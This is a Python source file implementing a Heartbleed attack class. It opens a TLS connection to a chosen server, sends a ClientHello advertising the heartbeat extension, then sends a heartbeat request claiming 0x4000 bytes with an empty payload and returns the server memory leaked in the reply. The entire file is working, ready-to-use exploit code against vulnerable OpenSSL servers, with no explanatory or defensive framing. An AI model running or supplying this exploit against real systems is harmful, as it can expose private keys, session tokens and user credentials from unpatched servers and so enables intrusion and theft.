import logging
import socket
import time
import os

from tls_attack.structure import *

class HeartbleedAttack:
    def __init__(self, server_addr, port = 443):
        self.server_addr = server_addr
        self.port = port

    def leak_data(self):
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((self.server_addr, self.port))

        client_hello = self._get_client_hello()
        connection.sendall(client_hello.encode())

        logging.info("Sending client hello : " + str(client_hello))

        # Waiting for the server hello response
        while True:
            server_hello = self._get_next_structure(connection)

            if type(server_hello.body) is TLSHandshake and type(server_hello.body.body) is TLSServerHello:
                break

        # We make sure the server supports and activated the heartbeat extensions 
        heartbeat_supported = False
        for extension in server_hello.body.body.extensions:
            if extension.extension_type == TLSExtensionType.HEARTBEAT:
                heartbeat_supported = True
                break

        if not heartbeat_supported:
            logging.error("Server '%s:%s' doesn't support the heartbeat extensions. Unable to heartbleed." % (self.server_addr, self.port))
            return b""

        heartbeat = self._get_heartbeat()
        connection.sendall(heartbeat.encode())

        logging.info("Sending heartbeat : " + str(heartbeat))

        # Waiting for the heartbeat response
        while True:
            heartbeat_response = self._get_next_structure(connection)

            if type(heartbeat_response.body) is TLSHeartbeat:
                return heartbeat_response.body.payload

    def _get_next_structure(self, connection):
        buf = b""

        while True:
            buf += connection.recv(1)
            header = TLSHeader()
            
            if not header.decode(buf) == 0:
                break

        return header

    def _get_heartbeat(self):
        return TLSHeader (
            version = TLSVersion.TLS10,
            body = TLSHeartbeat (
                heartbeat_type = TLSHeartbeatMessageType.HEARTBEAT_REQUEST,
                length = 0x4000,
                payload = b""
            )
        )

    def _get_client_hello(self):
        return TLSHeader (
            version = TLSVersion.TLS10,
            body = TLSHandshake (
                body = TLSClientHello (
                    version = TLSVersion.TLS10,
                    gmt_unix_timestamp = int(time.time()),
                    random_bytes = os.urandom(28),
                    cipher_suites = [
                        TLSCipherSuiteStruct ( cipher_suite =  TLSCipherSuite.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 ),
                        TLSCipherSuiteStruct ( cipher_suite =  TLSCipherSuite.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 ),
                        TLSCipherSuiteStruct ( cipher_suite =  TLSCipherSuite.TLS_DHE_RSA_WITH_AES_256_GCM_SHA384 ),
                        TLSCipherSuiteStruct ( cipher_suite =  TLSCipherSuite.TLS_DHE_RSA_WITH_AES_128_GCM_SHA256 ),
                        TLSCipherSuiteStruct ( cipher_suite =  TLSCipherSuite.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA ),
                        TLSCipherSuiteStruct ( cipher_suite =  TLSCipherSuite.TLS_DHE_RSA_WITH_AES_256_CBC_SHA256 ),
                        TLSCipherSuiteStruct ( cipher_suite =  TLSCipherSuite.TLS_DHE_RSA_WITH_AES_256_CBC_SHA ),
                        TLSCipherSuiteStruct ( cipher_suite =  TLSCipherSuite.TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA ),
                        TLSCipherSuiteStruct ( cipher_suite =  TLSCipherSuite.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA ),
                        TLSCipherSuiteStruct ( cipher_suite =  TLSCipherSuite.TLS_RSA_WITH_3DES_EDE_CBC_SHA )
                    ],
                    compression_methods = [ TLSCompressionStruct (
                        compression_method = TLSCompression.NULL
                    ) ],
                    extensions = [ 
                        TLSExtension (
                            extension_type = TLSExtensionType.EC_POINT_FORMATS,
                            extension_data = b"\x03\x00\x01\x02"
                        ),
                        TLSExtension (
                            extension_type = TLSExtensionType.ELLIPTIC_CURVES,
                            extension_data = b"\x00\x32\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10\x00\x11"
                        ),
                        TLSExtension (
                            extension_type = TLSExtensionType.SESSION_TICKET_TLS
                        ),
                        TLSExtension (
                            extension_type = TLSExtensionType.HEARTBEAT,
                            extension_data = b"\x01"
                        )
                    ]
                )
            )
        )

